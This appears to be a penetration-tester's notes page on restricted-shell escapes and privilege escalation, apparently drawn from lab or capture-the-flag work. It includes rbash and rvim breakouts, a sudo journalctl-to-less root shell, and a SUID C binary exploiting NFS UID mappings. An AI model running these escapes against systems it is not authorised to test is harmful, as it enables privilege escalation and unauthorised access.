---
icon: arrow-up-left-from-circle
---

# Environment Escapes

{% hint style="info" %}
### <mark style="color:purple;">Escape</mark> <mark style="color:orange;">`rbash`</mark>

* <mark style="color:purple;">It's possible to do it directly connecting with</mark> <mark style="color:orange;">**`ssh`**</mark><mark style="color:purple;">:</mark>

```sh
ssh -i priv_key drno@10.10.10.124 -t bash
```

* <mark style="color:purple;">Or directly changing the</mark> <mark style="color:orange;">**`PATH`**</mark><mark style="color:purple;">**:**</mark>

```sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

***

* <mark style="color:purple;">Is also possible by using</mark> <mark style="color:orange;">**`make`**</mark><mark style="color:purple;">. First sets a variable</mark> <mark style="color:orange;">**`COMMAND`**</mark> <mark style="color:purple;">with the value</mark> <mark style="color:orange;">**`/bin/bash`**</mark><mark style="color:purple;">**:**</mark>

```sh
 COMMAND='/bin/bash'
```

* <mark style="color:purple;">Then, execute</mark> <mark style="color:orange;">**`make`**</mark> <mark style="color:purple;">in silent mode (</mark><mark style="color:orange;">**`-s`**</mark><mark style="color:purple;">) and evaluates the string</mark> <mark style="color:orange;">**`x:`**</mark> <mark style="color:purple;">containing the shell:</mark>

```sh
make -s --eval=$'x:\n\t-'"$COMMAND"
```

* <mark style="color:purple;">Finish it up by fixing the</mark> <mark style="color:orange;">**`PATH`**</mark><mark style="color:purple;">**:**</mark>

```sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`sudo journalctl`</mark> <mark style="color:purple;">via</mark> <mark style="color:orange;">`less`</mark>&#x20;

* <mark style="color:orange;">**`journalctrl`**</mark> <mark style="color:purple;">will output to stdout if it can fit onto the current page, but into</mark> <mark style="color:orange;">**`less`**</mark> <mark style="color:purple;">if it canâ€™t.</mark>
* <mark style="color:purple;">When invoked with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">is possible to have code execution as</mark> <mark style="color:orange;">**`root`**</mark> <mark style="color:purple;">just by pressing</mark> <mark style="color:orange;">**`!`**</mark> <mark style="color:purple;">in the</mark> <mark style="color:orange;">**`less`**</mark> <mark style="color:purple;">environment.</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Escaping via</mark> <mark style="color:orange;">`NFS UID/GID`</mark> <mark style="color:purple;">Manipulation</mark>

<mark style="color:red;">**`Prerequisites`**</mark><mark style="color:purple;">:</mark>

1. <mark style="color:orange;">**`NFS`**</mark> <mark style="color:purple;">server must allow arbitrary</mark> <mark style="color:orange;">**`UID/GID`**</mark> <mark style="color:purple;">mappings (</mark><mark style="color:orange;">**`no_root_squash`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`no_all_squash`**</mark><mark style="color:purple;">, or similar).</mark>
2. <mark style="color:purple;">Access to a writable directory on the</mark> <mark style="color:orange;">**`NFS`**</mark> <mark style="color:purple;">share.</mark>
3. <mark style="color:purple;">Ability to execute compiled binaries on the</mark> <mark style="color:orange;">**`NFS`**</mark> <mark style="color:purple;">share.</mark>&#x20;

<mark style="color:red;">**`Exploit`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```c
#include <stdlib.h>
#include <unistd.h>

int main() {
    setreuid(1000, 1000);
    setregid(1000, 1000);
    system("/bin/bash");
    return 0;
}
```
{% endcode %}

* <mark style="color:purple;">Compile the exploit:</mark>

```sh
gcc -static shell.c -o shell
```

* <mark style="color:purple;">Now just copy the binary to the</mark> <mark style="color:orange;">**`NFS`**</mark> <mark style="color:purple;">share with</mark>  <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`SGID`**</mark> <mark style="color:purple;">permissions</mark><mark style="color:purple;">**:**</mark>

```sh
chmod ug+s /mnt/shell
```

* <mark style="color:purple;">Finally just execute it to become the user with</mark> <mark style="color:orange;">**`1000`**</mark> <mark style="color:purple;">permissions:</mark>

{% code title="Example" %}
```
/var/nfsshare/shell
```
{% endcode %}

* <mark style="color:purple;">This same technique could be used to escalate privilege to root by using</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`SGID`**</mark> <mark style="color:purple;">of 0 if the</mark> <mark style="color:orange;">**`NFS`**</mark> <mark style="color:purple;">share is configured with the</mark> <mark style="color:orange;">**`no_root_squash`**</mark> <mark style="color:purple;">or</mark> <mark style="color:orange;">**`no_all_squash`**</mark> <mark style="color:purple;">options.</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Escape</mark> <mark style="color:orange;">`rvim`</mark>

* <mark style="color:purple;">Run</mark> <mark style="color:orange;">**`rvim`**</mark><mark style="color:purple;">:</mark>

{% code title="sudo hijack example" %}
```sh
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```
{% endcode %}

* <mark style="color:purple;">And spawn the shell:</mark>

```
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```
{% endhint %}

